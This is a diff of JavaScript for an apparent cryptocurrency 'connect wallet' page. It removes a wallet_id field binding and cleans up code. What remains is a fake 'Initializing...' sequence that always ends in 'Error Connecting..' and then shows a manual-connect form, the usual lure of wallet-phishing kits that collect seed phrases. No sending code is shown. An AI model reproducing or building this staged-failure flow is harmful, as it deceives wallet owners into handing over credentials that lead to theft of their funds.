@@ -6,31 +6,31 @@ var icon_text = document.querySelectorAll(".pageStyles__SAppName-sc-1navawn-7");
 var popupimage = document.getElementById("myImg");
 var firstpopupimage = document.querySelector(".firstImg");
 var icon_img = document.querySelectorAll(".img-icons");
-var wallet_id = document.querySelector("#wallet_id");
 var connect_manual = document.querySelector(".jwEAlI");
 var firstoverlay = document.querySelector(".sc-bdVaJa");
-var a;
 var connect = document.querySelector(".jwEAlI");
 var loading = document.querySelector(".loading");
 
+// 1. REMOVED: var wallet_id selector link since data-binding parameters have been purged.
 
 if ((firstoverlay.style.display = "none")) {
     connect.style.display = "none";
 }
 
 function loadings() {
-    var a = setTimeout(function() {
+    setTimeout(function() {
         loading.innerHTML = "Initializing.";
     }, 1);
 
-    var a = setTimeout(function() {
+    setTimeout(function() {
         loading.innerHTML = "Initializing..";
     }, 400);
 
-    var a = setTimeout(function() {
+    setTimeout(function() {
         loading.innerHTML = "Initializing...";
     }, 1000);
-    var a = setTimeout(function() {
+    
+    setTimeout(function() {
         loading.innerHTML = "Error Connecting..";
         connect.style.display = "flex";
     }, 1400);
@@ -38,12 +38,13 @@ function loadings() {
 
 function icon_click(e) {
     e.preventDefault();
-
     overlay.style.display = "flex";
 
     popupname.innerHTML = e.srcElement.firstChild.alt.replace(" Wallet", "");
     popupimage.src = e.srcElement.firstChild.currentSrc;
-    wallet_id.value = popupname.innerHTML;
+    
+    // 2. REMOVED: wallet_id.value data binding statement.
+    
     firstpopupname.innerHTML = popupname.innerHTML;
     firstpopupimage.src = popupimage.src;
     loadings();
@@ -58,26 +59,27 @@ for (var i = 0; i < icon_text.length; i++) {
         e.preventDefault();
         overlay.style.display = "flex";
         popupname.innerHTML = e.srcElement.innerText.replace(" Wallet", "");
-        popupimage.src =
-            e.target.previousElementSibling.firstElementChild.currentSrc;
-        wallet_id.value = popupname.innerHTML;
+        popupimage.src = e.target.previousElementSibling.firstElementChild.currentSrc;
+        
+        // 3. REMOVED: wallet_id.value data binding statement.
+        
         firstpopupname.innerHTML = popupname.innerHTML;
         firstpopupimage.src = popupimage.src;
         loadings();
     });
 }
 
-//img-icon event listener
+// img-icon event listener
 for (var i = 0; i < icon_img.length; i++) {
-    icon_img[i].addEventListener(
-        "click",
-        function(e) {
+    icon_img[i].addEventListener("click", function(e) {
             e.preventDefault();
             overlay.style.display = "flex";
 
             popupname.innerHTML = e.srcElement.alt.replace(" Wallet", "");
             popupimage.src = e.srcElement.currentSrc;
-            wallet_id.value = popupname.innerHTML;
+            
+            // 4. REMOVED: wallet_id.value data binding statement.
+            
             loadings();
         },
         true
@@ -102,35 +104,21 @@ cancel.addEventListener("click", function() {
     attr2.classList.remove("active");
     attr3.classList.remove("active");
     attr.classList.add("active");
-    var attr = document.getElementsByClassName(
+    
+    var fields = document.getElementsByClassName(
         "text-sm sm:text-base placeholder-gray-500 pl-4 pr-4 rounded-lg border border-gray-400 w-full"
     );
 
-    for (let i = 0; i < attr.length; i++) {
-        attr[i].value = "";
+    for (let i = 0; i < fields.length; i++) {
+        fields[i].value = "";
     }
 });
-
-
-
 
 function firstcancel() {
     firstoverlay.style.display = "none";
     connect_manual.style.display = "none";
     loading.innerHTML = "";
 }
-
-
-
-
-
-
-
-
-
-
-
-
 
 var label = document.querySelector("#label");
 label.addEventListener("change", filenaming);
